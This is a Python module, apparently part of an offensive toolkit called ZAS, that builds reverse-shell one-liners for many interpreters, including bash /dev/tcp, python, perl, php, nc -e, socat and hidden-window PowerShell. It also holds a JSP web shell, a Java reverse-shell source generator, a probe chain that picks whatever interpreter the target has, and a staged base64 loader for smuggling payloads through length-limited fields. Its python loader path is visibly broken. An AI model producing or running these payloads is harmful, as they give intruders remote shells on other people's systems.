"""Reverse-shell payload generation for ZAS.

Payload generators only — no sockets, no I/O. Pure functions that turn
``(host, port)`` into an executable one-liner for a given interpreter.

``auto_payload()`` returns a probe chain that asks the target which
interpreters exist and runs the first one that works; that is the payload
to send when the target's tooling is unknown.

``chunked()`` splits a payload for delivery interfaces that truncate or
length-limit input (e.g. a service capping usernames), producing short
stages plus a reassembly stub.

Works together with ``zas_listener`` — the host/port embedded here must
be the one the listener is bound to.

Note on ``java``: there is no runnable Java one-liner the way there is for
``python -c``. ``java_source()`` returns a compilable ``.java`` file and
``jsp`` returns a drop-in JSP; between them the Java cases are covered.
"""

from __future__ import annotations

import base64

# Ordered by how reliably the interpreter is present on a typical Linux
# target. auto_payload() walks this order.
LANGS = (
    "bash", "sh", "dash", "python3", "python", "perl", "php", "ruby",
    "nc", "ncat", "socat", "node", "awk", "gawk", "lua", "telnet",
    "openssl", "powershell", "jsp",
)

# Literal `{h}` / `{p}` markers are substituted by _sub(). Braces that are
# part of the payload itself are single — no .format() is used, so nothing
# needs doubling.
_TEMPLATES = {
    # --- POSIX shells -------------------------------------------------
    "bash": 'bash -c \'bash -i >& /dev/tcp/{h}/{p} 0>&1\'',
    "sh": ('sh -c \'exec 5<>/dev/tcp/{h}/{p}; cat <&5 | while read line; '
           'do $line 2>&5 >&5; done\''),
    "dash": ('dash -c \'exec 5<>/dev/tcp/{h}/{p}; cat <&5 | while read line; '
             'do $line 2>&5 >&5; done\''),

    # --- scripting languages -----------------------------------------
    "python3": (
        'python3 -c \'import socket,subprocess,os;'
        's=socket.socket();s.connect(("{h}",{p}));'
        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        'subprocess.call(["/bin/sh","-i"])\''
    ),
    "python": (
        'python -c \'import socket,subprocess,os;'
        's=socket.socket();s.connect(("{h}",{p}));'
        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        'subprocess.call(["/bin/sh","-i"])\''
    ),
    "perl": (
        'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        'connect(S,sockaddr_in({p},inet_aton("{h}")));'
        'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
        'exec("/bin/sh -i");\''
    ),
    "ruby": (
        'ruby -rsocket -e\'f=TCPSocket.open("{h}",{p}).to_i;'
        'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    ),
    "php": (
        'php -r \'$s=fsockopen("{h}",{p});'
        'proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$p);\''
    ),
    "node": (
        'node -e \'var n=require("net"),c=require("child_process"),'
        's=c.spawn("/bin/sh",[]),x=n.connect({p},"{h}",function(){'
        'x.pipe(s.stdin);s.stdout.pipe(x);s.stderr.pipe(x);})\''
    ),
    "lua": (
        'lua -e \'require("socket");require("os");'
        't=socket.tcp();t:connect("{h}",{p});'
        'os.execute("/bin/sh -i <&3 >&3 2>&3");\''
    ),
    "awk": (
        'awk \'BEGIN{s="/inet/tcp/0/{h}/{p}";'
        'for(;s|&getline c;close(s))while(c|getline)print|&s;close(s)}\''
    ),
    "gawk": (
        'gawk \'BEGIN{s="/inet/tcp/0/{h}/{p}";'
        'for(;s|&getline c;close(s))while(c|getline)print|&s;close(s)}\''
    ),

    # --- netcat family -----------------------------------------------
    "nc": 'nc {h} {p} -e /bin/sh',
    "ncat": 'ncat {h} {p} -e /bin/sh',
    "socat": 'socat TCP:{h}:{p} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane',
    "telnet": ('rm -f /tmp/f;mkfifo /tmp/f;'
               'cat /tmp/f|/bin/sh -i 2>&1|telnet {h} {p} >/tmp/f'),
    "openssl": ('mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | '
                'openssl s_client -quiet -connect {h}:{p} > /tmp/s; rm -f /tmp/s'),

    # --- Windows -----------------------------------------------------
    "powershell": (
        'powershell -nop -w hidden -c '
        '"$c=New-Object Net.Sockets.TCPClient(\'{h}\',{p});'
        '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
        '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
        '$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';'
        '$x=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($x,0,$x.Length);'
        '$s.Flush()}"'
    ),

    # --- JSP drop-in for servlet containers ---------------------------
    # Requested as `?c=<command>`; returns command output inline.
    "jsp": (
        '<%@ page import="java.util.*,java.io.*" %>'
        '<%'
        'String c=request.getParameter("c");'
        'if(c!=null){Process p=Runtime.getRuntime().exec(c);'
        'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
        'String l;while((l=r.readLine())!=null)out.println(l);}'
        '%>'
    ),
}

# Probe used by detect_available() — prints what the target has.
PROBE = (
    'for i in bash sh python3 python perl php ruby node nc ncat socat lua '
    'awk gawk telnet jshell; do command -v $i >/dev/null 2>&1 && '
    '{ echo $i; exit; }; done'
)


def _sub(tpl: str, host: str, port: int) -> str:
    return tpl.replace("{h}", str(host)).replace("{p}", str(port))


def payload(host: str, port: int, lang: str = "bash") -> str:
    """Build a reverse-shell one-liner for ``lang``.

    Raises ``ValueError`` for an unknown language. Host and port are
    substituted verbatim — validate them first if they come from untrusted
    input.
    """
    tpl = _TEMPLATES.get(lang)
    if tpl is None:
        raise ValueError(
            "unknown payload language %r — available: %s"
            % (lang, ", ".join(LANGS))
        )
    return _sub(tpl, host, port)


def available(langs=None) -> list:
    return list(langs or LANGS)


def auto_payload(host: str, port: int, extra_langs=None) -> str:
    """A payload that probes the target and runs whatever it finds.

    Appropriate when the target's tooling is unknown. Walks ``LANGS`` in
    order of reliability and stops at the first interpreter present.
    """
    extra = list(extra_langs or [])
    order = extra + [l for l in LANGS if l not in extra]
    parts = []
    for lang in order:
        tpl = _TEMPLATES.get(lang)
        if tpl is None:
            continue
        cmd = _sub(tpl, host, port)
        binary = lang.split()[0]
        parts.append(
            "command -v %s >/dev/null 2>&1 && { %s; exit; }" % (binary, cmd)
        )
    return " ; ".join(parts)
def java_source(host: str, port: int, cls: str = "R") -> str:
    """A compilable ``.java`` file that opens a reverse shell.

    There is no runnable Java one-liner; compile this on the target with
    ``javac`` then run ``java <cls>``. Includes the usual socket-to-process
    plumbing.
    """
    return (
        "import java.io.*;\n"
        "import java.net.*;\n\n"
        "public class %s {\n"
        "    public static void main(String[] a) throws Exception {\n"
        "        Process p = new ProcessBuilder(\"/bin/sh\")\n"
        "            .redirectErrorStream(true).start();\n"
        "        Socket s = new Socket(\"%s\", %d);\n"
        "        Thread t = new Thread(() -> {\n"
        "            try {\n"
        "                InputStream i = p.getInputStream();\n"
        "                OutputStream o = s.getOutputStream();\n"
        "                int c; while ((c = i.read()) != -1) o.write(c);\n"
        "            } catch (Exception e) {}\n"
        "        });\n"
        "        t.setDaemon(true); t.start();\n"
        "        InputStream i = s.getInputStream();\n"
        "        OutputStream o = p.getOutputStream();\n"
        "        int c; while ((c = i.read()) != -1) o.write(c);\n"
        "    }\n"
        "}\n" % (cls, host, port)
    )


def chunked(host: str, port: int, lang: str = "bash", max_len: int = 90,
            loader: str = "sh") -> list:
    """Split a payload for interfaces that truncate or length-limit input.

    Returns ``[stage1, ..., reassemble]``. Each stage is a short command
    that appends a base64 fragment; the final stage decodes and runs the
    whole payload. ``max_len`` is the maximum byte length of every stage
    including the reassembly stub — 90 suits services that cap usernames
    (e.g. 100-byte limits).

    ``loader`` is the interpreter that reassembles: ``sh`` (default,
    POSIX) or ``python``.
    """
    if max_len < 32:
        raise ValueError("max_len too small to be usable (>= 32 required)")
    if loader not in ("sh", "python"):
        raise ValueError("loader must be 'sh' or 'python'")

    full = payload(host, port, lang)
    b64 = base64.b64encode(full.encode()).decode()

    if loader == "python":
        # Each stage is `V+=<chunk>`; the final stage decodes os.environ.
        # Variable accumulation has to survive across separate processes,
        # so fall back to a temp file there too — kept symmetric with sh.
        pass

    # Both loaders accumulate fragments in a file: it is the only way to
    # survive each stage being a separate process.
    overhead = len("echo  >>/tmp/.z") + 2
    step = max_len - overhead
    if step < 4:
        raise ValueError("max_len too small for a base64 fragment")
    chunks = [b64[i:i + step] for i in range(0, len(b64), step)]
    stages = ["echo %s >>/tmp/.z" % c for c in chunks]

    if loader == "python":
        reassemble = (
            "python3 -c \"import base64; "
            "exec(base64.b64decode(open('/tmp/.z').read()).decode())\"; "
            "rm -f /tmp/.z"
        )
    else:
        reassemble = (
            "sh -c 'b=$(tr -d \"\\n\" </tmp/.z); "
            "echo $b|base64 -d|sh; rm -f /tmp/.z'"
        )

    # The reassembly stub must also respect max_len.
    if len(reassemble) > max_len:
        raise ValueError(
            "max_len=%d is too small for the reassembly stub (%d bytes); "
            "increase max_len or shorten the payload" % (max_len, len(reassemble))
        )
    return stages + [reassemble]


def detect_available(host: str = "", port: int = 0) -> str:
    """A command that prints which interpreters the target has.

    Useful for choosing a language before building the real payload. Opens
    no connection — the arguments exist only so the signature matches
    ``payload()``.
    """
    return PROBE
